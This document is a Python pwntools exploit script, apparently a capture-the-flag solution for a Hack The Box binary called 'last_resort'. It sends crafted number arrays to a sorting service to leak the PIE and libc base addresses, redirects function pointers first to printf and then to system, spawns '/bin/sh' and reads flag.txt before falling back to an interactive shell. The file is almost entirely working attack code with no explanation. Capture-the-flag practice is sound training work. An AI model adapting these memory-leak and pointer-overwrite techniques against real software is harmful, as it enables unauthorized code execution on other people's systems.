from pwn import *
import re


elf = ELF("last_resort")
libc = ELF("libc.so.6")
context.binary = "./last_resort"
p = remote("localhost", 1337)


isFirst = True


def set_as_limit(val):
    p.recvuntil(b">")
    p.sendline(b"1")
    p.recvuntil(b">")
    p.sendline(b"2")
    p.recvuntil(b">")
    p.sendline(val)
    p.recvuntil(b">")
    p.sendline(b"4")


def send_sort(bitType: bytes, ordered: bool, count: bytes, payload):
    global isFirst
    if isFirst:
        p.recvuntil(b">")
        p.sendline(b"2")
        isFirst = False
    else:
        p.recvuntil(b"(y/n)")
        p.sendline(b"y")
    p.recvuntil(b">")
    p.sendline(bitType)
    p.recvuntil(b">")
    if ordered:
        p.sendline(b"1")
    else:
        p.sendline(b"2")
    p.recvuntil(b">")
    p.sendline(count)
    for i in range(int(count)):
        p.recvuntil(b">")
        p.sendline(str(payload[i]).encode())


def bytes_under_0x80(addr, skip_low=0):
    return all(((addr >> (8 * i)) & 0xFF) < 0x80 for i in range(skip_low, 6))


def sort_again(bitType=b"@", bitOrder=b"@", bitCount=b"@"):
    global isFirst
    isFirst = False
    p.recvuntil(b">")
    p.sendline(b"y")
    p.recvuntil(b">")
    p.sendline(bitType)
    if bitType == b"@":
        return
    p.recvuntil(b">")
    p.sendline(bitOrder)
    if bitOrder == b"@":
        return
    p.recvuntil(b">")
    p.sendline(bitCount)
    if bitCount == b"@":
        return
    p.recvuntil(b">")
    p.sendline(b"@")


def twosComplement(number, width):
    return (-number) & width


def negNumber(number, len):
    comp = 0
    neg = 0
    if len == 1:
        comp = twosComplement(number, 0xFF)
        neg = 0x80 - comp
    elif len == 2:
        comp = twosComplement(number, 0xFFFF)
        neg = 0x8000 - comp
    elif len == 4:
        comp = twosComplement(number, 0xFFFFFFFF)
        neg = 0x80000000 - comp
    else:
        comp = twosComplement(number, 0xFFFFFFFFFFFFFFFF)
        neg = 0x8000000000000000 - comp
    return neg


info("Setup for Exploit")
set_as_limit(b"8096")
p.recvuntil(b">")
p.sendline(b"1")
p.recvuntil(b">")
p.sendline(b"1")
p.recvuntil(b">")
p.sendline(b"8")
p.recvuntil(b">")
p.sendline(b"4")


info("PIE")

number = 0xFF
neg_number = negNumber(number, 1)
payload = [number] * 1 + [neg_number] * 1023
send_sort(bitType=b"1", ordered=True, count=b"1024", payload=payload)

number = 0x000F00000000000
neg_number = negNumber(number, 8)
payload = [number] * 1 + [neg_number] * 127
send_sort(bitType=b"4", ordered=True, count=b"128", payload=payload)

sort_again(bitType=b"4", bitOrder=b"1", bitCount=b"2")
p.recvuntil(b"result:\n")
value = p.recvuntil(b"\n")
pie_leak_str = value.split(b",")[0].decode()
pie_leak = int(pie_leak_str)
while pie_leak & 0xFF != 0x42:
    pie_leak = pie_leak >> 8
pie_hex = hex(pie_leak)[2:]
if len(pie_hex) > 12:
    pie_hex = pie_hex.replace("ff", "")
pie_leak = int(pie_hex, 16)
elf.address = pie_leak - elf.sym.compar4_dec
if elf.address < (1 << 40):
    error(f"PIE Leak failed, not enough bytes {elf.address:#x}")
    exit(1)
info("PIE Leak: %x", elf.address)

compar4 = elf.sym["compar4_dec"]
compar3 = elf.sym["compar3_dec"]

good = bytes_under_0x80(compar4) and bytes_under_0x80(compar3)

if not good:
    error("compare functions DOESN'T have all bytes below 0x80")
    exit(1)


# cleanup and restore
p.sendline(b"n")
isFirst = True

p.recvuntil(b">")
p.sendline(b"1")
p.recvuntil(b">")
p.sendline(b"1")
p.recvuntil(b">")
p.sendline(b"1")
p.recvuntil(b">")
p.sendline(b"3")
p.recvuntil(b">")
p.sendline(b"4")


info("Setting printf")
number = 0xFF
neg_number = negNumber(number, 1)
payload = [number] * 1 + [neg_number] * 1023
send_sort(bitType=b"1", ordered=True, count=b"1024", payload=payload)
for i in range(15):
    payload = [number] * 1 + [neg_number] * 9
    p.recvuntil(b"(y/n)")
    p.sendline(b"y")
    p.recvuntil(b">")
    p.sendline(b"1")
    p.recvuntil(b">")
    p.sendline(b"1")
    p.recvuntil(b">")
    p.sendline(b"1024")
    for i in range(10):
        p.recvuntil(b">")
        p.sendline(str(payload[i]).encode())
    p.sendline(b"@")

number = elf.plt.printf
neg_number = negNumber(number, 8)
payload = [number] * 1 + [neg_number] * 127
send_sort(bitType=b"4", ordered=True, count=b"128", payload=payload)
info("Printf setup complete")

info("Getting LibC Leak")
payload = []
for i in range(512):
    payload += [28709] * 10 + [0] * 502
send_sort(bitType=b"2", ordered=True, count=b"512", payload=payload)
sort_again(bitType=b"4", bitOrder=b"2", bitCount=b"128")
value = p.recvuntil(b"result:\n")
matches = re.findall(rb"0x7f[0-9a-f]+[0-9a-f]+", value)
libc_leak = None
if matches:
    for m in matches:
        addr = int(m, 16)
        base = addr - 0x216A00
        if (base & 0xFFF) == 0 and base > 0x7F0000000000 and base < 0x7FFFFFFFF000:
            libc_leak = addr
            break
    if libc_leak is None:
        error("Printf worked, but only leaked stack addresses!")
        exit(1)
else:
    error("NO LIBC FOUND EXITING (printf didn't work)")
    exit(1)


# Now libc_leak is guaranteed to be set
libc.address = libc_leak - 0x216A00
info("Found LibC Leak %x", libc_leak)
info("LibC Address: %x", libc.address)


info("Getting a shell")
p.recvuntil(b"\n")
p.sendline(b"n")
isFirst = True


info("Setting mem_reduce_function and system")
number = 0xFF
neg_number = negNumber(number, 1)
payload = [number] * 1 + [neg_number] * 1023
send_sort(bitType=b"1", ordered=True, count=b"1024", payload=payload)

for i in range(7):
    p.recvuntil(b"(y/n)")
    p.sendline(b"y")
    p.recvuntil(b">")
    p.sendline(b"1")
    p.recvuntil(b">")
    p.sendline(b"1")
    p.recvuntil(b">")
    p.sendline(b"1024")
    payload = [number] * 1 + [neg_number] * 9
    for i in range(10):
        p.recvuntil(b">")
        p.sendline(str(payload[i]).encode())
    p.sendline(b"@")

number = 0xFFFFFFFF
neg_number = negNumber(number, 4)
payload = [number] * 1 + [neg_number] * 255
send_sort(bitType=b"3", ordered=True, count=b"256", payload=payload)

number = libc.sym.system
neg_number = negNumber(number, 8)
payload = [number] * 1 + [neg_number] * 127
send_sort(bitType=b"4", ordered=True, count=b"128", payload=payload)

number = elf.sym.mem_reduce_function
neg_number = negNumber(number, 8)
payload = [number] * 1 + [neg_number] * 127
send_sort(bitType=b"4", ordered=True, count=b"128", payload=payload)
info("Functions setup complete!")

info("Calling mem_reduce_function")
payload = [0] * 2
send_sort(bitType=b"3", ordered=False, count=b"2", payload=payload)
p.recvuntil(b"wish to use:")
p.sendline(b"-1")

info("Calling system('/bin/sh')")
payload = [u64(b"/bin/sh\00")] + [0]
send_sort(bitType=b"4", ordered=False, count=b"2", payload=payload)

info("Getting flag")
sleep(2)
p.sendline(b"cat flag.txt")
for i in range(5):
    flag = p.recvregexS(r"HTB\{[^}]+\}", timeout=2)
    if flag:
        success("Flag: %s", flag)
        p.close()
        exit(0)
    else:
        info("Trying again")
        sleep(2)
        p.sendline(b"cat flag.txt")
info("Cat flag.txt didn't work, switching to interactive")
p.interactive()
